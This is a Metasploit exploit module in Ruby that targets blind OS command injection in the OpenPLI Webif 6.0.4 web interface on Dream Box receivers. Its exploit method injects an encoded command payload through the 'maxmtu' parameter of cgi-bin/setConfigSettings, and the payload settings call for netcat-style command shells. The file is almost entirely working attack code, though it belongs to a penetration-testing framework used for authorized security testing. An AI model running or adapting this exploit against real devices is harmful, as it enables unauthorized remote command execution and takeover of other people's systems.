##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'OpenPLI Webif Arbitrary Command Execution',
      'Description'   => %q{
          Some Dream Boxes with OpenPLI v3 beta Images are vulnerable to OS command
        injection in the Webif 6.0.4 Web Interface. This is a blind injection, which means
        that you will not see any output of your command. A ping command can be used for
        testing the vulnerability.  This module has been tested in a box with the next
        features: Linux Kernel version 2.6.9 (build@plibouwserver) (gcc version 3.4.4) #1
        Wed Aug 17 23:54:07 CEST 2011, Firmware release 1.1.0 (27.01.2013), FP Firmware
        1.06 and Web Interface 6.0.4-Expert (PLi edition).
      },
      'Author'        => [ 'm-1-k-3' ],
      'License'       => MSF_LICENSE,
      'References'    =>
        [
          [ 'OSVDB', '90230' ],
          [ 'BID', '57943' ],
          [ 'EDB', '24498' ],
          [ 'URL', 'http://openpli.org/wiki/Webif' ],
          [ 'URL', 'http://www.s3cur1ty.de/m1adv2013-007' ]
        ],
      'Platform'     => ['unix', 'linux'],
      'Arch'         => ARCH_CMD,
      'Privileged'   => true,
      'Payload'      =>
        {
          'Space'       => 1024,
          'DisableNops' => true,
          'Compat'      =>
            {
              'PayloadType' => 'cmd',
              'RequiredCmd' => 'netcat generic'
            }
        },
      'Targets'      =>
        [
          [ 'Automatic Target', { }]
        ],
      'DefaultTarget' => 0,
      'DisclosureDate' => 'Feb 08 2013'
    ))
  end

  def exploit
    print_status("#{rhost}:#{rport} - Sending remote command...")
    vprint_status("#{rhost}:#{rport} - Blind Exploitation - unknown Exploitation state")
    begin
      send_request_cgi(
        {
          'uri'    => normalize_uri("cgi-bin", "setConfigSettings"),
          'method' => 'GET',
          'vars_get' => {
            "maxmtu" => "1500&#{payload.encoded}&"
          }
        })

    rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
      fail_with(Msf::Exploit::Failure::Unreachable, "#{rhost}:#{rport} - HTTP Connection Failed, Aborting")
    end
  end
end
